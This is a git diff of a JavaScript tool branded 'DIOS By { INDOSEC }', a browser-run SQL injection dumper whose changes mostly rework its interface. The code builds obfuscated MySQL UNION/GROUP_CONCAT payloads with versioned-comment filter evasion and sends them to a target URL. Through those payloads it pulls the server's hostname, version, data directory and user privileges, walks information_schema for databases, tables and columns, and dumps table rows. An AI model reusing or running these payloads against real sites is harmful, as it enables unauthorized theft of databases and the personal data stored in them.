@@ -10,7 +10,7 @@ $(document).ready(function () {
     let res_tbody = '<tbody class="bg-white divide-y divide-gray-200" id="tbody_template"></tbody>'
 
     document.title = "DIOS By { INDOSEC }";
-
+    
     function importcss(link) {
         let links = document.createElement('link')
         links.rel = 'stylesheet'
@@ -45,9 +45,9 @@ $(document).ready(function () {
     function request(url) {
         return $.ajax({
             url: url,
-            success: function (data) {
+            success: function(data) {
                 return data;
-            }
+            }        
         });
     }
 
@@ -61,12 +61,12 @@ $(document).ready(function () {
         return text.replace(search, replace)
     }
 
-    importcss("https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.0.2/tailwind.min.css")
-    importjs("https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js")
-
     function PayloadConcat(string) {
         return `/*!50000%43o%4Ec%41t/**12345**/(${stringtohex('<inject>')},unhex(hex(/*!50000Gr%6fuP_c%6fnCAT(${string}))),${stringtohex("</inject> <!--")})*/`
     }
+
+    importcss("https://unpkg.com/tailwindcss@^2/dist/tailwind.min.css")
+    importjs("https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js")
 
     async function setUrl() {
         const {
@@ -84,8 +84,6 @@ $(document).ready(function () {
     }
 
     async function tampilan() {
-
-
         $("head").append('<meta name="viewport" content="width=device-width, initial-scale=1.0">')
         $("body").addClass("bg-gray-800 overflow-auto")
         $("body").removeClass("swal2-shown")
@@ -109,19 +107,11 @@ $(document).ready(function () {
     </div>
     
     <div class="container mx-auto mt-4">
+        <ul class="flex text-gray-500 text-sm lg:text-base bg-white p-3 rounded-md" id="menuscontrol"></ul>
         <div class="flex flex-col">
             <div class="-my-2 overflow-x-auto sm:-mx-6 lg:-mx-8">
                 <div class="py-2 align-middle inline-block min-w-full sm:px-6 lg:px-8">
                     <div class="shadow overflow-hidden border-b border-gray-200 sm:rounded-lg">
-                        <div id="showtable" class="text-white text-lg inline-flex">
-                            <a id="backdb" class="cursor-pointer mr-3">
-                                Database
-                            </a> > <div id="data" class="ml-3"></div>
-                        </div>
-                        <div id="showcolum" class="text-white text-lg inline-flex">
-                            <a id="backtable" class="cursor-pointer mr-3">Table</a> >
-                            <div id="nametable" class="ml-3"></div>
-                        </div>
                         <table class="min-w-full divide-y divide-gray-200" id="output">
                             <thead class="bg-gray-50" id="thead_template">
                             </thead>
@@ -251,21 +241,52 @@ $(document).ready(function () {
     </div>`
 
         $("body").html(template)
-        $("#time").append(moment().format('LLLL'))
+        
+        setInterval(function(){
+            $("#time").html(moment().format('LL, hh:mm:ss a'))
+        },1000)
+        
+        await getInfo()
         setDatabase()
-        getInfo()
+
         $("#output_info").hide()
 
-        $("#getInfo").on('click', function () {
+        $("#getInfo").on('click', function() {
             $("#output").hide()
             $("#output_info").show()
         })
 
-        $("#getData").on('click', function () {
+        $("#getData").on('click', function() {
             $("#output").show()
             $("#output_info").hide()
         })
 
+    }
+
+    async function getInfo() {
+        let urlinject = urls
+
+        let UUID = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('UUID/**INDOSEC**/()'))))
+        const hostname = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
+        const currentDB = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('database/**INDOSEC**/()'))))
+        const user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**INDOSEC**/()'))))
+        const CurrentUser = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('current_user/**INDOSEC**/()'))))
+        const os = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
+        const version = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
+        const port = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
+        const dataDir = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
+        const TempDirectory = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
+        const BITSDETAILS = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
+        const FILESYSTEM = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
+        const symlink = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
+        const ssl = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
+        const privilage = await regexs(await request( await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))))
+
+        let arr = ['UUID','hostname','currentDB','user','CurrentUser','os','version','port','dataDir','TempDirectory','BITSDETAILS','FILESYSTEM','symlink','ssl','privilage']
+
+        arr.forEach(element => {
+            $(`#${element}`).html(eval(element))
+        })
     }
 
     async function setDatabase() {
@@ -277,46 +298,17 @@ $(document).ready(function () {
 
         urlinject = await replaceText(urlinject, '{::}', PayloadConcat('schema_name'))
         urlinject = await replaceText(urlinject, '+--+-', '+from+/*!50000inforMAtion_schema*/.schemata+--+-')
-        databases = await regexs(await request(urlinject))
+        databases = await regexs( await request (urlinject) )
         viewDatabase()
     }
 
-    async function getInfo() {
-        let urlinject = urls
-
-        let UUID = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('UUID/**INDOSEC**/()'))))
-        const hostname = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@hostname'))))
-        const currentDB = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('database/**INDOSEC**/()'))))
-        const user = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('user/**INDOSEC**/()'))))
-        const CurrentUser = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('current_user/**INDOSEC**/()'))))
-        const os = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@version_compile_os'))))
-        const version = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version'))))
-        const port = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@port'))))
-        const dataDir = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@datadir'))))
-        const TempDirectory = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@tmpdir'))))
-        const BITSDETAILS = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@version_compile_machine'))))
-        const FILESYSTEM = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!12345@@CHARACTER_SET_FILESYSTEM'))))
-        const symlink = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_symlink'))))
-        const ssl = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('/*!00000@@GLOBAL.have_ssl'))))
-        const privilage = await regexs(await request(await replaceText(urlinject, '{::}', PayloadConcat('(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)'))))
-
-        let arr = ['UUID', 'hostname', 'currentDB', 'user', 'CurrentUser', 'os', 'version', 'port', 'dataDir', 'TempDirectory', 'BITSDETAILS', 'FILESYSTEM', 'symlink', 'ssl', 'privilage']
-
-        arr.forEach(element => {
-            $(`#${element}`).html(eval(element))
-        })
-    }
-
     async function viewDatabase() {
-
-        $("#showtable").hide()
-        $("#showcolum").hide()
-
         let splitdb = databases.split(",")
         let number = 1
-
         let thead_col = ["No.", "Databases", "Action"]
+        
         $("#output").html(res_thead + res_tbody)
+        $("#menuscontrol").hide()
 
         thead_col.forEach(col => {
             $("#thead_template").append(`
@@ -350,34 +342,29 @@ $(document).ready(function () {
         $("button").on('click', function () {
             setTable($(this).data('database'))
         })
-
     }
 
     async function setTable(database) {
-
+        
         let urlinject = urls
         database_select = database
 
         $("#data").html(database)
-        $("#showtable").show()
 
         urlinject = await replaceText(urlinject, '{::}', PayloadConcat('table_name'))
         urlinject = await replaceText(urlinject, '+--+-', `+from+/*!50000inforMAtion_schema*/.tables+/*!50000wHEre*/+/*!50000taBLe_scheMA*/like+${stringtohex(database)}+--+-`)
 
         tables = await regexs(await request(urlinject))
         viewTable()
-
-        $("#backdb").on('click', function () {
-            viewDatabase()
-        })
     }
 
     async function viewTable() {
-        $("#showcolum").hide()
         let splitable = tables.split(",")
         let number = 1
         let thead_col = ["No.", "Tables", "Action"]
+
         $("#output").html(res_thead + res_tbody)
+        $("#menuscontrol").show()
 
         thead_col.forEach(col => {
             $("#thead_template").append(`
@@ -408,21 +395,39 @@ $(document).ready(function () {
             number++
         })
 
+        $("#menuscontrol").html(`
+        <li class="inline-flex items-center">
+            <a id="backdb" class="cursor-pointer">Home</a>
+            <svg
+                class="h-5 w-auto text-gray-400"
+                fill="currentColor"
+                viewBox="0 0 20 20"
+            >
+                <path
+                fill-rule="evenodd"
+                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
+                clip-rule="evenodd"
+                ></path>
+            </svg>
+        </li>
+        <li class="inline-flex items-center">
+            <a class="text-purple-800">${database_select}</a>
+        </li>
+        `)
+
+        $("#backdb").on('click', function () {
+            viewDatabase()
+        })
+
         $("button").on('click', function () {
             setColumns($(this).data('table'))
         })
     }
 
     async function setColumns(table) {
+
         let urlinjection = urls
         table_select = table
-
-        $("#showcolum").show()
-        $("#nametable").html(table)
-
-        $("#backtable").on('click', function () {
-            viewTable()
-        })
 
         urlinjection = await replaceText(urlinjection, '{::}', PayloadConcat('column_name'))
         urlinjection = await replaceText(urlinjection, '+--+-', `+from+/*!50000inforMAtion_schema*/.columns+/*!50000wHEre*/+/*!50000taBLe_name*/=CHAR(${stringtochar(table)})+--+-`)
@@ -434,6 +439,7 @@ $(document).ready(function () {
     async function viewColumns() {
         let splitcolumns = columns.split(",")
         $("#output").html(res_thead + res_tbody)
+        $("#menuscontrol").show()
 
         splitcolumns.forEach(col => {
             $("#thead_template").append(`
@@ -441,7 +447,46 @@ $(document).ready(function () {
                     ${col}
                 </th>
             `)
-        });
+        })
+
+        $("#menuscontrol").html(`
+        <li class="inline-flex items-center">
+            <a id="backdb" class="cursor-pointer">Home</a>
+            <svg
+            class="h-5 w-auto text-gray-400"
+            fill="currentColor"
+            viewBox="0 0 20 20"
+            >
+            <path
+                fill-rule="evenodd"
+                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
+                clip-rule="evenodd"
+            ></path>
+            </svg>
+        </li>
+        <li class="inline-flex items-center">
+            <a id="backtable" class="cursor-pointer">${database_select}</a>
+            <svg
+            class="h-5 w-auto text-gray-400"
+            fill="currentColor"
+            viewBox="0 0 20 20"
+            >
+            <path
+                fill-rule="evenodd"
+                d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z"
+                clip-rule="evenodd"
+            ></path>
+            </svg>
+        </li>
+        <li class="inline-flex items-center">
+            <a class="text-purple-800">${table_select}</a>
+        </li>
+        `)
+
+        $("#backtable").on('click', function () {
+            viewTable()
+        })
+
         setData(table_select)
     }
 
@@ -453,7 +498,7 @@ $(document).ready(function () {
         urlinjection = urlinjection.replace('+--+-', `+from+${database_select}.${table}+--+-`)
 
         let res = await request(urlinjection)
-        dataTable = await regexs(res.replace(/(\r\n|\n|\r)/gm, ""))
+        dataTable = await regexs(res.replace(/(\r\n|\n|\r)/gm,""))
         viewData()
     }
 
@@ -466,7 +511,7 @@ $(document).ready(function () {
             let splitDatacol = splitData[index].split("{:::}")
 
             splitDatacol.forEach(dataCol => {
-                $("#tbody_template").append(`
+                    $("#tbody_template").append(`
                         <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                             ${dataCol.replace(/<(.|\n)*?>/g, '')}
                         </td>
